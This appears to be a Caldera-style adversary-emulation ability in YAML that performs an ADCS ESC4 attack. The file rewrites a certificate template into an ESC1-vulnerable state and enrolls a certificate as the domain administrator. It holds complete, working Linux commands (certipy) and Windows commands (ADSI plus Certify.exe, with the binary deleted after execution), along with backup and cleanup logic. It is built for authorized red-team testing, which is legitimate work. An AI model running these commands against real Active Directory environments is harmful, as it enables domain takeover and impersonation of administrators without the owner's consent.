- id: f33a18f2-2e34-4431-856f-dafe447bdedc
  name: 'ADCS ESC4: Reconfigure Vulnerable Template then Enroll'
  description: |
    MODIFIES AD STATE. Abuse an ESC4 template (dangerous write permissions over the template object) to escalate to domain administrator. Back up the template, rewrite it into an ESC1-vulnerable configuration, enroll a certificate as the domain administrator, then restore the original configuration in cleanup. Fires only when enumeration produced esc4.template.name facts.

    Linux: certipy template --write-default-configuration for the rewrite and restore; certipy req for the certificate request. Backup/restore confirmed via certipy output strings and structural diff.

    Windows: [ADSI] (System.DirectoryServices.DirectoryEntry) for the template rewrite and restore - pure .NET LOTL, no external tools. The four attributes modified (msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage, msPKI-Certificate-Application-Policy, msPKI-Enrollment-Flag) are backed up to a JSON file in env:TEMP before any write. The nTSecurityDescriptor (ACL) is intentionally not modified; the assumed-breach user already holds enrollment rights via Full Control / All Extended Rights. Certify runs via [Diagnostics.Process]::Start() for the certificate request (same Process.Start approach as ESC1). Cleanup restores the original attribute values, verifies msPKI-Certificate-Name-Flag is no longer 1, and emits the restored values to the operation view for confirmation.

    Safety: snapshot the DC before running. The backup-once pattern protects against a second forward run overwriting the clean backup with a post-modification snapshot. If the operation is stopped without cleanup the template remains ESC1-vulnerable until manually restored from the retained backup file.
  tactic: privilege-escalation
  technique:
    attack_id: T1649
    name: Steal or Forge Authentication Certificates
  platforms:
    linux:
      sh:
        command: |
          cd /tmp; rm -f "adcs_esc4_#{esc4.template.name}.pfx" "adcs_esc4_#{esc4.template.name}.log" "adcs_esc4_#{esc4.template.name}_restore.log"; if [ ! -s "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" ]; then certipy template -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -template '#{esc4.template.name}' -save-configuration "adcs_esc4_#{esc4.template.name}_backup.json" >"adcs_esc4_#{esc4.template.name}.log" 2>&1; fi; [ -s "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" ] || { echo "ESC4 ABORTED AT BACKUP: no usable backup of template #{esc4.template.name} exists. AD HAS NOT BEEN MODIFIED." >&2; cat "adcs_esc4_#{esc4.template.name}.log" 2>/dev/null >&2; exit 1; }; certipy template -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -template '#{esc4.template.name}' -write-default-configuration 'S-1-5-11' -no-save -force >>"adcs_esc4_#{esc4.template.name}.log" 2>&1; grep -Eq 'Successfully updated|the same as old configuration' "adcs_esc4_#{esc4.template.name}.log" || { echo "ESC4 REWRITE FAILED: LDAP modify of template #{esc4.template.name} was not confirmed. AD IS PROBABLY UNMODIFIED, but verify manually. Backup retained at /tmp/adcs_esc4_#{esc4.template.name}_backup.json" >&2; cat "adcs_esc4_#{esc4.template.name}.log" >&2; exit 1; }; sleep 15; certipy req -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -target '#{esc.ca.host}' -target-ip '#{esc.ca.ip}' -ca '#{esc4.ca.name}' -template '#{esc4.template.name}' -upn 'administrator@#{esc.domain.fqdn}' -out "adcs_esc4_#{esc4.template.name}" >>"adcs_esc4_#{esc4.template.name}.log" 2>&1; [ -f "/tmp/adcs_esc4_#{esc4.template.name}.pfx" ] || { echo "ESC4 REQUEST FAILED AFTER REWRITE. Template #{esc4.template.name} IS CURRENTLY VULNERABLE. Restoring inline now." >&2; certipy template -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -template '#{esc4.template.name}' -write-configuration "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" -no-save -force >"adcs_esc4_#{esc4.template.name}_restore.log" 2>&1; grep -Eq 'Successfully updated|the same as old configuration' "adcs_esc4_#{esc4.template.name}_restore.log" && echo "INLINE RESTORE OK: template #{esc4.template.name} returned to its original configuration." >&2 || echo "INLINE RESTORE FAILED: TEMPLATE #{esc4.template.name} IS STILL ESC1-VULNERABLE AND GRANTS ENROLLMENT TO AUTHENTICATED USERS. Restore by hand from /tmp/adcs_esc4_#{esc4.template.name}_backup.json" >&2; cat "adcs_esc4_#{esc4.template.name}.log" >&2; exit 1; }; echo "/tmp/adcs_esc4_#{esc4.template.name}.pfx"
        cleanup: |
          cd /tmp; [ -s "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" ] || { echo "ESC4 CLEANUP: no backup file present, nothing to restore (either the ability never modified AD, or a prior cleanup already restored and removed it)." >&2; exit 0; }; certipy template -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -template '#{esc4.template.name}' -write-configuration "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" -no-save -force >"/tmp/adcs_esc4_#{esc4.template.name}_cleanup.log" 2>&1; grep -Eq 'Successfully updated|the same as old configuration' "/tmp/adcs_esc4_#{esc4.template.name}_cleanup.log" || { echo "ESC4 CLEANUP RESTORE FAILED: TEMPLATE #{esc4.template.name} MAY STILL BE ESC1-VULNERABLE. Backup deliberately RETAINED at /tmp/adcs_esc4_#{esc4.template.name}_backup.json - restore it by hand." >&2; cat "/tmp/adcs_esc4_#{esc4.template.name}_cleanup.log" >&2; exit 1; }; echo "ESC4 CLEANUP RESTORE OK: template #{esc4.template.name} is at its original configuration." >&2; rm -f "/tmp/adcs_esc4_#{esc4.template.name}_backup.json" "/tmp/adcs_esc4_#{esc4.template.name}.pfx" "/tmp/adcs_esc4_#{esc4.template.name}.log" "/tmp/adcs_esc4_#{esc4.template.name}_restore.log" "/tmp/adcs_esc4_#{esc4.template.name}_cleanup.log"
        timeout: 600
        parsers:
          plugins.stockpile.app.parsers.esc_pfx:
          - source: esc.cert.pfx
    windows:
      psh:
        command: |
          $cwd=[IO.Directory]::GetCurrentDirectory(); $tpl='#{esc4.template.name}'; $pfxPath=Join-Path $cwd ('adcs_esc4_'+$tpl+'_win.pfx'); Remove-Item $pfxPath -EA SilentlyContinue; $domainParts='#{esc.domain.fqdn}'.Split('.') | ForEach-Object {"DC=$_"}; $domainDN=$domainParts -join ','; $templateDN="CN=$tpl,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDN"; $backupPath=Join-Path $env:TEMP ('adcs_esc4_'+$tpl+'_win_backup.json'); if(-not (Test-Path $backupPath)){ $de=[ADSI]("LDAP://#{esc.domain.dc_ip}/"+$templateDN); @{NameFlag=[int]$de.Properties['msPKI-Certificate-Name-Flag'].Value; EKU=@($de.Properties['pKIExtendedKeyUsage']); AppPolicy=@($de.Properties['msPKI-Certificate-Application-Policy']); EnrollFlag=[int]$de.Properties['msPKI-Enrollment-Flag'].Value} | ConvertTo-Json | Set-Content $backupPath }; if(-not (Test-Path $backupPath)){ Write-Error 'ESC4 WIN ABORTED: backup write failed. AD NOT MODIFIED.'; exit 1 }; $de=[ADSI]("LDAP://#{esc.domain.dc_ip}/"+$templateDN); $de.Properties['msPKI-Certificate-Name-Flag'].Value=1; $de.Properties['pKIExtendedKeyUsage'].Clear(); $de.Properties['pKIExtendedKeyUsage'].Add('1.3.6.1.5.5.7.3.2'); $de.Properties['msPKI-Certificate-Application-Policy'].Clear(); $de.Properties['msPKI-Certificate-Application-Policy'].Add('1.3.6.1.5.5.7.3.2'); $de.Properties['msPKI-Enrollment-Flag'].Value=0; $de.SetInfo(); $de.RefreshCache(); if([int]$de.Properties['msPKI-Certificate-Name-Flag'].Value -ne 1){ Write-Error 'ESC4 WIN REWRITE FAILED: LDAP write not confirmed. AD PROBABLY UNMODIFIED.'; exit 1 }; Start-Sleep 15; $cp=Join-Path $cwd 'Certify.exe'; $cb=[IO.File]::ReadAllBytes($cp); Remove-Item $cp -Force -EA SilentlyContinue; $bf=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($bf,$cb); $tf=[IO.Path]::GetTempFileName(); $certArgs=@("request","/ca:#{esc.ca.host}\#{esc4.ca.name}","/template:$tpl","/altname:administrator"); $j=Start-Job -ScriptBlock {param([string]$bfile,[string[]]$a,[string]$tfile) $psi=New-Object Diagnostics.ProcessStartInfo($bfile,($a -join ' ')); $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.UseShellExecute=$false; $psi.CreateNoWindow=$true; $proc=[Diagnostics.Process]::Start($psi); $stdout=$proc.StandardOutput.ReadToEnd(); $proc.WaitForExit(); Remove-Item $bfile -Force -EA SilentlyContinue; [IO.File]::WriteAllText($tfile,$stdout)} -ArgumentList $bf,$certArgs,$tf; Wait-Job $j|Out-Null; Remove-Job $j; Remove-Item $bf -Force -EA SilentlyContinue; $pem=[IO.File]::ReadAllText($tf); Remove-Item $tf -Force; $km=[regex]::Match($pem,'(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----'); $cm=[regex]::Match($pem,'(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----'); if(-not $km.Success -or -not $cm.Success){ Write-Error 'ESC4 WIN REQUEST FAILED. Template IS currently ESC1-vulnerable. Attempting inline restore.'; $bk=Get-Content $backupPath | ConvertFrom-Json; $der=[ADSI]("LDAP://#{esc.domain.dc_ip}/"+$templateDN); $der.Properties['msPKI-Certificate-Name-Flag'].Value=[int]$bk.NameFlag; $der.Properties['pKIExtendedKeyUsage'].Clear(); foreach($v in @($bk.EKU)){ $der.Properties['pKIExtendedKeyUsage'].Add($v) }; $der.Properties['msPKI-Certificate-Application-Policy'].Clear(); foreach($v in @($bk.AppPolicy)){ $der.Properties['msPKI-Certificate-Application-Policy'].Add($v) }; $der.Properties['msPKI-Enrollment-Flag'].Value=[int]$bk.EnrollFlag; $der.SetInfo(); $der.RefreshCache(); Write-Error 'Inline restore attempted. Verify template state manually if unsure.'; Write-Output $pem; exit 1 }; $keyDer=[Convert]::FromBase64String(($km.Groups[1].Value -replace '\s','')); $certDer=[Convert]::FromBase64String(($cm.Groups[1].Value -replace '\s','')); function Read-DerLength { param([byte[]]$Data,[ref]$Offset) $first=$Data[$Offset.Value]; $Offset.Value++; if($first -lt 0x80){ return $first }; $numBytes=$first -band 0x7F; $len=0; for($i=0;$i -lt $numBytes;$i++){ $len=($len -shl 8) -bor $Data[$Offset.Value]; $Offset.Value++ }; return $len }; function Read-DerInteger { param([byte[]]$Data,[ref]$Offset) if($Data[$Offset.Value] -ne 0x02){ throw 'bad INTEGER' }; $Offset.Value++; $len=Read-DerLength -Data $Data -Offset $Offset; $bytes=New-Object byte[] $len; [Array]::Copy($Data,$Offset.Value,$bytes,0,$len); $Offset.Value+=$len; if($bytes.Length -gt 1 -and $bytes[0] -eq 0x00){ $tmp2=New-Object byte[] ($bytes.Length-1); [Array]::Copy($bytes,1,$tmp2,0,$tmp2.Length); $bytes=$tmp2 }; return ,$bytes }; function Pad-Left { param([byte[]]$Bytes,[int]$Length) if($Bytes.Length -eq $Length){ return ,$Bytes }; if($Bytes.Length -gt $Length){ throw 'too long' }; $out=New-Object byte[] $Length; [Array]::Copy($Bytes,0,$out,$Length-$Bytes.Length,$Bytes.Length); return ,$out }; $off=[ref]0; if($keyDer[$off.Value] -ne 0x30){ throw 'not SEQUENCE' }; $off.Value++; [void](Read-DerLength -Data $keyDer -Offset $off); [void](Read-DerInteger -Data $keyDer -Offset $off); $n=Read-DerInteger -Data $keyDer -Offset $off; $e=Read-DerInteger -Data $keyDer -Offset $off; $d=Read-DerInteger -Data $keyDer -Offset $off; $p=Read-DerInteger -Data $keyDer -Offset $off; $q=Read-DerInteger -Data $keyDer -Offset $off; $dp=Read-DerInteger -Data $keyDer -Offset $off; $dq=Read-DerInteger -Data $keyDer -Offset $off; $qi=Read-DerInteger -Data $keyDer -Offset $off; $ml=$n.Length; $hl=[int][Math]::Ceiling($ml/2.0); $rp=New-Object System.Security.Cryptography.RSAParameters; $rp.Modulus=Pad-Left -Bytes $n -Length $ml; $rp.Exponent=$e; $rp.D=Pad-Left -Bytes $d -Length $ml; $rp.P=Pad-Left -Bytes $p -Length $hl; $rp.Q=Pad-Left -Bytes $q -Length $hl; $rp.DP=Pad-Left -Bytes $dp -Length $hl; $rp.DQ=Pad-Left -Bytes $dq -Length $hl; $rp.InverseQ=Pad-Left -Bytes $qi -Length $hl; $rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider; $rsa.ImportParameters($rp); $cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certDer); $ck=[System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($cert,$rsa); $pfxBytes=$ck.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,''); [System.IO.File]::WriteAllBytes($pfxPath,$pfxBytes); if(Test-Path $pfxPath){ Write-Output $pfxPath } else { Write-Error 'ESC4 WIN FAILED: PFX not written'; exit 1 }
        cleanup: |
          $cwd=[IO.Directory]::GetCurrentDirectory(); $tpl='#{esc4.template.name}'; $domainParts='#{esc.domain.fqdn}'.Split('.') | ForEach-Object {"DC=$_"}; $domainDN=$domainParts -join ','; $templateDN="CN=$tpl,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDN"; $backupPath=Join-Path $env:TEMP ('adcs_esc4_'+$tpl+'_win_backup.json'); $pfxPath=Join-Path $cwd ('adcs_esc4_'+$tpl+'_win.pfx'); if(-not (Test-Path $backupPath)){ Write-Host 'ESC4 WIN CLEANUP: no backup found, nothing to restore (prior cleanup may have run).' -ForegroundColor Green; exit 0 }; $bk=Get-Content $backupPath | ConvertFrom-Json; $der=[ADSI]("LDAP://#{esc.domain.dc_ip}/"+$templateDN); $der.Properties['msPKI-Certificate-Name-Flag'].Value=[int]$bk.NameFlag; $der.Properties['pKIExtendedKeyUsage'].Clear(); foreach($v in @($bk.EKU)){ $der.Properties['pKIExtendedKeyUsage'].Add($v) }; $der.Properties['msPKI-Certificate-Application-Policy'].Clear(); foreach($v in @($bk.AppPolicy)){ $der.Properties['msPKI-Certificate-Application-Policy'].Add($v) }; $der.Properties['msPKI-Enrollment-Flag'].Value=[int]$bk.EnrollFlag; $der.SetInfo(); $der.RefreshCache(); if([int]$der.Properties['msPKI-Certificate-Name-Flag'].Value -eq 1){ Write-Error ('ESC4 WIN CLEANUP RESTORE FAILED: msPKI-Certificate-Name-Flag still 1. Template '+$tpl+' MAY STILL BE ESC1-VULNERABLE. Backup retained: '+$backupPath); exit 1 }; $der.RefreshCache(); Write-Host ('ESC4 WIN RESTORE VERIFIED: '+$tpl+' | NameFlag='+[int]$der.Properties["msPKI-Certificate-Name-Flag"].Value+' EnrollFlag='+[int]$der.Properties["msPKI-Enrollment-Flag"].Value+' EKUs='+($der.Properties["pKIExtendedKeyUsage"] -join ',')); Remove-Item $backupPath -Force -EA SilentlyContinue; Remove-Item $pfxPath -EA SilentlyContinue
        timeout: 600
        payloads:
        - Certify.exe
        parsers:
          plugins.stockpile.app.parsers.esc_pfx:
          - source: esc.cert.pfx
